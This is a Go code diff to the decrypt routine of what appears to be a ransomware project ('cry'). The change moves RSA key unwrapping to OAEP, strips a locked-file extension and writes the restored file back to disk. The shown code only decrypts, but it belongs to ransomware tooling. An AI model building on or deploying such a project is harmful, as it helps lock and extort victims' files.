@@ -3,8 +3,14 @@ package main
 import (
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/rand"
 	"crypto/rsa"
+	"fmt"
 	"io/ioutil"
+
+	"crypto/sha256"
+
+	"strings"
 
 	"github.com/redpois0n/cry/common"
 )
@@ -16,8 +22,12 @@ func decrypt(file string, priv *rsa.PrivateKey) {
 		panic(err)
 	}
 
-	header := data[:common.KeySize+aes.BlockSize]
-	header, err = rsa.DecryptPKCS1v15(nil, priv, header)
+	header := data[:common.EncryptedHeaderSize]
+	label := []byte("")
+
+	fmt.Println(header)
+
+	header, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, header, label)
 
 	if err != nil {
 		panic(err)
@@ -26,7 +36,7 @@ func decrypt(file string, priv *rsa.PrivateKey) {
 	key := header[:common.KeySize]
 	iv := header[common.KeySize : common.KeySize+aes.BlockSize]
 
-	data = data[common.KeySize+aes.BlockSize:]
+	data = data[common.EncryptedHeaderSize:]
 
 	block, err := aes.NewCipher(key)
 
@@ -37,5 +47,9 @@ func decrypt(file string, priv *rsa.PrivateKey) {
 	cipher := cipher.NewCFBDecrypter(block, iv)
 	cipher.XORKeyStream(data, data)
 
-	//ioutil.WriteFile(file, data, 0777) // TODO
+	if strings.HasSuffix(file, common.LockedExtension) {
+		file = file[:len(file)-len(common.LockedExtension)]
+	}
+
+	ioutil.WriteFile(file, data, 0777) // TODO
 }
